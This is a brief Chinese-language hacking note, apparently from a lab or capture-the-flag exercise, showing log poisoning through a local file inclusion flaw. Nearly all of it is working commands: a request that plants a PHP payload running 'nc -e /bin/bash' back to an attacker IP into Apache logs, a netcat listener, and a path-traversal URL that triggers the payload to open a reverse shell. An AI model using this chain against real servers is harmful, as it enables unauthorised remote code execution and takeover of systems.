
### 日志中毒  if have LFI  



让我们使用日志中毒攻击来注入我们的有效载荷。

```
kali@kali:~$ echo "GET <?php system('nc -e /bin/bash 192.168.118.9 444'); ?> HTTP/1.1" | nc 192.168.120.167 80
```

首先，我们将启动我们的监听器。

```
kali@kali:~$ sudo nc -nvlp 444
listening on [any] 444 ...
```

接下来，我们使用 LFI 触发我们的有效载荷。

```
kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log
```